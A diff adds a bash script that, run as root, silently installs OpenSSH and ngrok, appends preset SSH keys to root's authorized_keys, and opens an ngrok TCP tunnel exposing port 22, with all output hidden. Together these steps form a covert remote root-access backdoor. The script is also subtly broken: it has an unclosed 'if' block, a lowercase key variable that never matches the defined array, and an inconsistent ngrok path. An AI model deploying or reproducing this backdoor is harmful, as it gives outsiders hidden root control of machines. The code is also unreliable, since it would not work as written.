@@ -1,0 +1,136 @@
+#!/bin/bash
+
+NGROK_AUTH_TOKEN="YOUR_NGROK_AUTH_TOKEN"
+SSH_KEYS=(
+    "ssh-rsa AAAAB3NzaC1yc2EAAA...example-key1... user1@example.com"
+    "ssh-rsa AAAAB3NzaC1yc2EAAA...example-key2... user2@example.com"
+)
+
+NGROK_VERSION="2.3.40"
+NGROK_PATH="/usr/local/bin/ngrok"
+
+if [ "$EUID" -ne 0 ]; then
+    echo "This script must be run as root."
+    exit 1
+fi
+
+install_wget_or_curl() {
+    if [ -x "$(command -v apt-get)" ]; then
+        apt-get update -qq > /dev/null 2>&1
+        apt-get install -y -qq wget curl > /dev/null 2>&1
+    if [ -x "$(command -v apt)" ]; then
+        apt update -qq > /dev/null 2>&1
+        apt install -y -qq wget curl > /dev/null 2>&1
+    elif [ -x "$(command -v dnf)" ]; then
+        dnf install -y -q wget curl > /dev/null 2>&1
+    elif [ -x "$(command -v yum)" ]; then
+        yum install -y -q wget curl > /dev/null 2>&1
+    elif [ -x "$(command -v pacman)" ]; then
+        pacman -S --noconfirm --quiet wget curl > /dev/null 2>&1
+    fi
+}
+
+install_wget_or_curl_if_not_installed() {
+    if [ -x "$(command -v wget)" ]; then
+        return
+    elif [ -x "$(command -v curl)" ]; then
+        return
+    else
+        install_wget_or_curl
+    fi
+}
+
+install_and_setup_ngrok() {
+    if [ -x "$(command -v wget)" ]; then
+        wget -q "https://bin.equinox.io/c/${NGROK_VERSION}/ngrok-stable-linux-amd64.zip" -O ngrok.zip > /dev/null 2>&1
+        unzip -q ngrok.zip > /dev/null 2>&1
+        rm ngrok.zip > /dev/null 2>&1
+        chmod +x ngrok > /dev/null 2>&1
+        mv ngrok $NGROK_PATH/ > /dev/null 2>&1
+    elif [ -x "$(command -v curl)" ]; then
+        curl -L "https://bin.equinox.io/c/${NGROK_VERSION}/ngrok-stable-linux-amd64.zip" -o ngrok.zip > /dev/null 2>&1
+        unzip -q ngrok.zip > /dev/null 2>&1
+        rm ngrok.zip > /dev/null 2>&1
+        chmod +x ngrok > /dev/null 2>&1
+        mv ngrok $NGROK_PATH/ > /dev/null 2>&1
+    fi
+}
+
+install_and_setup_ngrok_if_not_installed(){
+      if [ -x "$(command -v $NGROK_PATH/ngrok)" ]; then
+          return
+      else
+          install_and_setup_ngrok
+      fi
+}
+
+ssh_is_enabled() {
+    if [ -x "$(command -v systemctl)" ]; then
+        systemctl is-enabled ssh >/dev/null 2>&1
+        return $?
+    else
+        return
+    fi
+}
+
+install_and_enable_ssh_if_not_enabled() {
+    if ssh_is_enabled; then
+        return
+    elif [ -x "$(command -v apt-get)" ]; then
+        apt-get update -qq > /dev/null 2>&1
+        apt-get install -y -qq openssh-server > /dev/null 2>&1
+        systemctl enable ssh > /dev/null 2>&1
+        systemctl start ssh > /dev/null 2>&1
+    elif [ -x "$(command -v apt)" ]; then
+        apt update -qq > /dev/null 2>&1
+        apt install -y -qq openssh-server > /dev/null 2>&1
+        systemctl enable ssh >/dev/null 2>&1
+        systemctl start ssh >/dev/null 2>&1
+    elif [ -x "$(command -v dnf)" ]; then
+        dnf install -y -q openssh-server > /dev/null 2>&1
+        systemctl enable sshd >/dev/null 2>&1
+        systemctl start sshd >/dev/null 2>&1
+    elif [ -x "$(command -v yum)" ]; then
+        yum install -y -q openssh-server > /dev/null 2>&1
+        systemctl enable sshd >/dev/null 2>&1
+        systemctl start sshd >/dev/null 2>&1
+    elif [ -x "$(command -v pacman)" ]; then
+        pacman -S --noconfirm --quiet openssh > /dev/null 2>&1
+        systemctl enable sshd >/dev/null 2>&1
+        systemctl start sshd >/dev/null 2>&1
+    fi
+}
+
+prepare_ngrok_ssh_configuration() {
+    echo "authtoken: $NGROK_AUTH_TOKEN" > $NGROK_PATH/ngrok.yml
+    echo "tunnels:" >> $NGROK_PATH/ngrok.yml
+    echo "  ssh:" >> $NGROK_PATH/ngrok.yml
+    echo "    proto: tcp" >> $NGROK_PATH/ngrok.yml
+    echo "    addr: 22" >> $NGROK_PATH/ngrok.yml
+}
+
+add_ssh_keys_to_root() {
+    local keys="$@"
+    local root_ssh_dir="/root/.ssh"
+    local authorized_keys="$root_ssh_dir/authorized_keys"
+
+    if [ ! -d "$root_ssh_dir" ]; then
+        mkdir -p "$root_ssh_dir"
+        chmod 700 "$root_ssh_dir"
+    fi
+
+    for key in $keys; do
+        echo "$key" >> "$authorized_keys"
+    done
+
+    chmod 600 "$authorized_keys"
+}
+
+
+install_wget_or_curl_if_not_installed
+install_and_enable_ssh_if_not_enabled
+install_and_setup_ngrok_if_not_installed
+
+prepare_ngrok_ssh_configuration > /dev/null 2>&1
+add_ssh_keys_to_root "${ssh_keys[@]}" > /dev/null 2>&1
+$NGROK_PATH/ngrok start -config=$NGROK_PATH/ngrok.yml ssh > /dev/null 2>&1
